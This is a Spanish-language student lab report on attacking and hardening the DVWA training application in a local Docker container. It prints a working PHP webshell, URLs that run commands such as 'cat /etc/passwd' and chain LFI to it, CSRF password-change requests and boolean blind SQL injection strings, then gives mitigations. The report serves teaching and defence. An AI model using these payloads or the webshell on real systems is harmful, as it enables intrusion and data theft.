# Ficha Técnica Estandarizada — FC-LAB-010 (lab-10-dvwa-avanzado)

| Campo | Detalle en el Proyecto |
| :--- | :--- |
| **Identificador** | **FC-LAB-010** |
| **Nombre de la Práctica** | Auditoría y Explotación Avanzada en Servidor Web DVWA (CSRF, RCE vía File Upload, LFI y Blind SQLi) |
| **Versión** | 1.0 (Noviembre 2026) |
| **Dominio Metodológico** | **D03 — Seguridad web** (con alcance en D01 Sistemas y D04 Aplicaciones) |
| **Fase de ÆVØID** | **Fase 03 — Identificación, Fase 04 — Análisis & Fase 05 — Mitigación** |
| **Enfoque** | Ofensivo / Defensivo (Red Team, Blue Team & Purple Team) |
| **Estándar de Referencia** | **OWASP Top 10 (A01: Broken Access Control, A03: Injection, A05: Security Misconfiguration)** |
| **Equipo Ejecutor** | Maryori Barrera, Cristian Hernández, Sebastian Jurado, Julian Roa, Andres Rozo |
| **Docente** | Sergio Arley Puerto Moreno |

---

### 1. ¿Cuál es el objetivo de esta práctica?
El objetivo de este laboratorio fue profundizar en las pruebas sobre la plataforma **Damn Vulnerable Web Application (DVWA)** ejecutándose en un contenedor Docker sobre Kali Linux, pero avanzando hacia vulnerabilidades de mayor complejidad que permiten tomar el control del servidor y extraer información de forma silenciosa.

En esta segunda fase práctica evaluamos cuatro vectores críticos:
1. **Cross-Site Request Forgery (CSRF):** Modificación no consentida del estado de la sesión y cambio de credenciales de acceso administrativo.
2. **Subida Irrestricta de Archivos (Unrestricted File Upload):** Creación y despliegue de una *webshell* PHP para lograr Ejecución Remota de Comandos (**RCE**).
3. **Inclusión Local de Archivos (Local File Inclusion - LFI):** Traversal de rutas para leer archivos confidenciales del sistema operativo Linux (`/etc/passwd`) y su encadenamiento con la webshell subida previamente.
4. **Inyección SQL a Ciegas (Blind SQL Injection - Boolean Based):** Inferencia lógica basada en respuestas diferenciadas de verdadero/falso para extraer el nombre de la base de datos sin recibir mensajes de error ni tablas en pantalla.

En cada módulo primero verificamos el comportamiento normal con entradas legítimas y luego manipulamos las peticiones para analizar el impacto real y definir los parches defensivos correspondientes.

---

### 2. ¿Cómo nos repartimos los roles?
* **Analista Ofensivo (Red Team):** Redacción del script de webshell en PHP con `nano`, inyección de parámetros maliciosos por URL, bypass de formularios mediante peticiones HTTP directas y formulación de consultas lógicas booleanas para extracción ciega.
* **Analista Defensivo (Blue Team):** Inspección del código fuente vulnerable en PHP, identificación de la ausencia de tokens anti-CSRF, análisis de fallas en el almacenamiento de subidas y formulación de reglas de sanitización, sentencias preparadas y directivas de servidor web (Apache/Nginx).
* **Evaluador Purple Team:** Documentar la trazabilidad probatoria, medir la severidad de cada hallazgo con la matriz de riesgos de ÆVØID y verificar que los controles propuestos neutralicen la explotación sin degradar el funcionamiento de la aplicación.

---

### 3. Entorno de Trabajo y Despliegue
* **Sistema Operativo Anfitrión:** Kali Linux (Rolling Release).
* **Entorno de Contención:** Contenedor Docker ejecutando la imagen oficial de DVWA en el puerto local `8080` (`http://localhost:8080`).
* **Nivel de Seguridad:** **Low** (código sin validaciones para analizar la vulnerabilidad en su estado puro y entender su causa raíz).
* **Herramientas Utilizadas:** Navegador web Mozilla Firefox, editor de texto `nano`, comandos nativos de Linux (`curl`, `whoami`, `cat`, `ls`, `uname`).

---

### 4. Procedimiento Técnico Paso a Paso y Resultados Obtenidos

#### Módulo 1: Cross-Site Request Forgery (CSRF) — OWASP A01
1. **Comportamiento Normal:** Ingresamos al módulo CSRF y cambiamos la contraseña del usuario `admin` a través del formulario oficial. La aplicación procesó el cambio y confirmó en pantalla con el mensaje:
   ```text
   Password Changed
   ```
2. **Alteración por Petición Directa (URL Manipulation):**  
   Observamos que la aplicación tramita la solicitud mediante el método `GET` sin exigir la contraseña actual ni solicitar confirmación:
   ```http
   GET /vulnerabilities/csrf/?password_new=hacked123&password_conf=hacked123&Change=Change# HTTP/1.1
   Host: localhost:8080
   Cookie: PHPSESSID=...; security=low
   ```
3. **Resultado y Análisis:**  
   La contraseña fue modificada exitosamente **directamente desde la barra de direcciones de la URL**, sin necesidad de interactuar con el formulario.
   * *Causa raíz:* La aplicación confía ciegamente en la cookie de sesión activa que el navegador envía automáticamente y **carece de tokens anti-CSRF únicos por petición**. Un atacante podría engañar a un administrador logueado mediante una etiqueta `<img src="...">` oculta en un correo o sitio web externo para cambiarle la contraseña sin que se dé cuenta.

#### Módulo 2: Subida de Archivos Irrestricta (File Upload) y RCE — OWASP A03 / A05 (¡Hallazgo Crítico!)
1. **Creación de la Webshell:**  
   Desde la terminal de Kali Linux abrimos el editor `nano` y creamos un script ligero en PHP llamado `shell.php`:
   ```php
   <?php
   if(isset($_REQUEST['cmd'])){
       echo "<pre>";
       $cmd = ($_REQUEST['cmd']);
       system($cmd);
       echo "</pre>";
       die;
   }
   ?>
   ```
2. **Carga en el Servidor:**  
   Accedimos al módulo *File Upload* y seleccionamos `shell.php`. La aplicación aceptó el archivo inmediatamente, sin verificar la extensión, sin comprobar el tipo MIME ni inspeccionar el contenido binario, devolviendo la ruta pública relativa donde quedó almacenado:
   ```text
   ../../hackable/uploads/shell.php successfully uploaded!
   ```
3. **Ejecución Remota de Comandos (RCE):**  
   Navegamos hacia la ruta del archivo subido pasando el parámetro `cmd` por la URL para interactuar directamente con el sistema operativo del servidor:
   * **Identificación del Usuario del Proceso:**  
     `http://localhost:8080/hackable/uploads/shell.php?cmd=whoami`  
     * *Respuesta del servidor:* `www-data` (usuario estándar del servicio web Apache).
   * **Reconocimiento del Directorio de Trabajo:**  
     `http://localhost:8080/hackable/uploads/shell.php?cmd=pwd`  
     * *Respuesta del servidor:* `/var/www/html/hackable/uploads`
   * **Listado Básico de Archivos:**  
     `http://localhost:8080/hackable/uploads/shell.php?cmd=ls`  
     * *Respuesta del servidor:* Muestra los archivos almacenados en la carpeta de subidas, incluyendo nuestro `shell.php`.
   * **Listado Detallado con Permisos y Propietarios:**  
     `http://localhost:8080/hackable/uploads/shell.php?cmd=ls -la`  
     * *Respuesta del servidor:* Expone permisos de lectura, escritura y ejecución (`drwxrwxr-x`), tamaños y usuarios dueños.
   * **Enumeración del Sistema Operativo y Kernel:**  
     `http://localhost:8080/hackable/uploads/shell.php?cmd=uname -a`  
     * *Respuesta del servidor:* Linux debian/docker con arquitectura y versión exacta del kernel en ejecución.
   * **Exfiltración de Cuentas Locales del Sistema:**  
     `http://localhost:8080/hackable/uploads/shell.php?cmd=cat /etc/passwd`  
     * *Resultado Crítico:* **Lectura completa de todos los usuarios del sistema operativo**, sus directorios *home* y sus *shells* por defecto (`/bin/bash`, `/bin/sh`, `/usr/sbin/nologin`).

#### Módulo 3: Inclusión Local de Archivos (LFI) y Encadenamiento con Webshell — OWASP A01 / A03 (¡Hallazgo Crítico!)
1. **Comportamiento Normal:**  
   Ingresamos al módulo *File Inclusion*. Al hacer clic en los enlaces de prueba, la URL carga:
   ```text
   http://localhost:8080/vulnerabilities/fi/?page=file1.php
   ```
   La aplicación incluye y muestra el contenido legítimo de `file1.php`.
2. **Directory Traversal y Fuga de Archivos Internos:**  
   Reemplazamos el valor del parámetro `page` por una ruta absoluta del sistema:
   ```text
   http://localhost:8080/vulnerabilities/fi/?page=/etc/passwd
   ```
   * *Resultado:* El servidor procesó la inclusión y **renderizó el contenido de `/etc/passwd` en medio de la página web**, confirmando la vulnerabilidad de LFI por falta de validación de rutas.
3. **Encadenamiento Avanzado (LFI + Webshell):**  
   Aprovechando que en el Módulo 2 habíamos subido `shell.php`, utilizamos el parámetro `page` para forzar a la aplicación a incluir nuestra webshell desde la carpeta de subidas mediante rutas relativas:
   ```text
   http://localhost:8080/vulnerabilities/fi/?page=../../hackable/uploads/shell.php&cmd=whoami
   ```
   * *Resultado:* El servidor incluyó el archivo PHP y ejecutó la función pasando el comando `whoami`, respondiendo con `www-data`.
   * Repetimos con `cmd=ls`, `cmd=pwd` y `cmd=uname -a`, demostrando que incluso si la carpeta de subidas tuviera deshabilitada la ejecución directa vía web, **la falla de LFI permite reactivar el archivo e invocar comandos arbitrarios del sistema operativo**.

#### Módulo 4: Inyección SQL a Ciegas (Blind SQL Injection - Boolean Based) — OWASP A03
1. **Comportamiento Normal:**  
   Ingresamos el valor numérico `1` en el campo *User ID*. La aplicación respondió únicamente:
   ```text
   User ID exists in the database.
   ```
   A diferencia del módulo de SQLi convencional, aquí la aplicación no devuelve nombres, apellidos ni mensajes de error detallados; solo indica si el registro existe o no.
2. **Verificación de Respuesta Booleana Diferenciada:**  
   Introdujimos una condición lógica falsa controlada:
   ```sql
   1' AND 1=2 #
   ```
   * *Resultado:* La aplicación respondió:
   ```text
   User ID is MISSING from the database.
   ```
   * *Conclusión:* Al obtener una respuesta observable distinta para una condición verdadera (*exists*) frente a una condición falsa (*is MISSING*), **hemos confirmado la existencia de un canal de inferencia booleano**.
3. **Inferencia de Metadatos del Motor:**  
   Probamos si existe una base de datos activa:
   ```sql
   1' AND database() IS NOT NULL #
   ```
   * *Respuesta:* `User ID exists in the database.` (Verdadero: confirma base de datos relacional activa).
4. **Extracción Carácter por Carácter con `SUBSTRING()`:**  
   Formulamos una hipótesis sobre la primera letra del nombre de la base de datos:
   ```sql
   1' AND SUBSTRING(database(),1,1)='d' #
   ```
   * *Respuesta:* `User ID exists in the database.` (Verdadero: la primera letra es `'d'`).
5. **Confirmación Completa del Nombre:**  
   Comprobamos la cadena total:
   ```sql
   1' AND database()='dvwa' #
   ```
   * *Resultado:* `User ID exists in the database.` (Verdadero: se confirma con absoluta certeza que la base de datos se denomina **`dvwa`**).

---

### 5. Tabla Comparativa de Vulnerabilidades Evaluadas

| Vulnerabilidad | Módulo | Entrada / Técnica Aplicada | Impacto Técnico Demostrado | Categoría OWASP |
| :--- | :--- | :--- | :--- | :---: |
| **CSRF** | CSRF | Manipulación directa de parámetros GET en URL | Cambio no autorizado de clave administrativa sin token ni validación de sesión previa. | **A01:2021** |
| **File Upload (RCE)** | File Upload | Subida de `shell.php` con función `system()` | Ejecución remota de comandos como `www-data` y lectura arbitraria de `/etc/passwd`. | **A03:2021 / A05:2021** |
| **LFI Traversal** | File Inclusion | Traversal de ruta `page=/etc/passwd` | Lectura de ficheros sensibles locales del sistema operativo anfitrión. | **A01:2021** |
| **LFI + Upload (RCE Chaining)** | File Inclusion + Upload | `page=../../hackable/uploads/shell.php&cmd=whoami` | Reactivación y ejecución de scripts subidos mediante inclusión forzada de archivos. | **A03:2021** |
| **Blind SQLi (Booleana)** | SQLi (Blind) | `1' AND 1=2 #` y `1' AND database()='dvwa' #` | Reconstrucción inferencial del esquema y nombres de bases de datos carácter por carácter. | **A03:2021** |

---

### 6. Análisis Defensivo y Plan de Mitigación (Blue Team)

Como futuros ingenieros de sistemas, concluimos que estas cuatro vulnerabilidades representan los puntos de quiebre más graves en la arquitectura de un servidor web. A continuación establecemos las soluciones de ingeniería para remediarlas definitivamente:

1. **Defensa contra CSRF (Tokens de Sincronización y SameSite):**
   * **Synchronizer Token Pattern:** Generar un token criptográficamente aleatorio (`bin2hex(random_bytes(32))`), asociarlo a la sesión del usuario e incluirlo en un campo oculto del formulario:
     ```html
     <input type="hidden" name="user_token" value="<?php echo $_SESSION['token']; ?>">
     ```
   * **Verificación Estricta en Servidor:** Al recibir la solicitud, comprobar que `hash_equals($_SESSION['token'], $_POST['user_token'])` sea verdadero.
   * **Cambio Obligatorio de Método:** Nunca procesar acciones que alteren estado mediante `GET`; utilizar únicamente `POST` o `PUT`.
   * **Re-autenticación:** Exigir siempre la contraseña actual antes de autorizar el cambio a una nueva clave.
   * **Cookies con Atributo SameSite:** Configurar `SameSite=Strict` o `SameSite=Lax` en las cookies de sesión para que el navegador no las adjunte en peticiones que se originen desde sitios externos.

2. **Defensa contra Subida de Archivos y RCE (Validación Profunda y Aislamiento):**
   * **Lista Blanca de Extensiones (Whitelisting):** Permitir únicamente extensiones seguras e inofensivas (`jpg`, `jpeg`, `png`, `pdf`). Rechazar categóricamente extensiones ejecutables (`php`, `phtml`, `php5`, `phar`, `sh`, `exe`).
   * **Inspección de Cabeceras MIME y Contenido Binario:** No fiarse del `Content-Type` enviado por el cliente. Usar `finfo_file()` en PHP o librerías de procesamiento gráfico (`getimagesize()`) para validar la estructura interna del archivo.
   * **Renombrado Criptográfico y Eliminación de Rutas:** Reemplazar el nombre del archivo subido por un identificador único aleatorio (UUID v4 o hash SHA-256) sin mantener la extensión original ejecutable.
   * **Almacenamiento Fuera de la Raíz Web:** Guardar los archivos en una carpeta fuera del directorio raíz (`/var/www/uploads` en lugar de `/var/www/html/uploads`) o en un servicio de almacenamiento de objetos (Amazon S3 / Google Cloud Storage).
   * **Deshabilitar la Ejecución en el Servidor Web:** En Apache, bloquear el intérprete de PHP dentro de la carpeta de subidas mediante `.htaccess` o configuración global:
     ```apache
     <Directory "/var/www/html/uploads">
         php_flag engine off
         Options -ExecCGI -Indexes
         RemoveHandler .php .phtml .php3
     </Directory>
     ```

3. **Defensa contra Inclusión de Archivos (LFI):**
   * **Lista Blanca Rígida:** Mapear los identificadores permitidos a archivos estáticos sin concatenar parámetros del usuario:
     ```php
     $allowed_pages = [
         'file1' => 'file1.php',
         'file2' => 'file2.php',
         'file3' => 'file3.php'
     ];
     $page = $_GET['page'] ?? 'file1';
     if (array_key_exists($page, $allowed_pages)) {
         include($allowed_pages[$page]);
     } else {
         http_response_code(404);
         include("404.php");
     }
     ```
   * **Sanitización de Rutas:** Si es estrictamente necesario manejar nombres de archivo, usar `basename()` para despojar prefijos de directorios (`../` o `/`) y verificar con `realpath()` que la ruta canónica permanezca dentro del directorio autorizado.

4. **Defensa contra Blind SQL Injection (Parametrización Absoluta):**
   * Reemplazar todas las consultas dinámicas por sentencias preparadas con **PDO**:
     ```php
     $stmt = $pdo->prepare('SELECT first_name, last_name FROM users WHERE user_id = :id');
     $stmt->execute(['id' => $id]);
     $exists = $stmt->fetch() !== false;
     ```
   * Unificar los tiempos y mensajes de respuesta para que no revelen detalles internos sobre la existencia o ausencia de registros cuando se manejen consultas de autenticación.

---

### 7. Criterio de Aceptación y Validación Metodológica en ÆVØID
* **Condición de Éxito:** Se documentaron con rigor las cuatro explotaciones controladas, registrando el impacto en confidencialidad (lectura de `/etc/passwd` y extracción de nombre de base de datos), integridad (cambio forzado de clave por CSRF) y disponibilidad/control (ejecución remota de comandos como `www-data`).
* **Conformidad Metodológica:** Los hallazgos se integran formalmente a la **Fase 03 (Identificación)** y nutren la **Fase 04 (Análisis)** y **Fase 05 (Mitigación)** del ciclo de vida de **ÆVØID**.
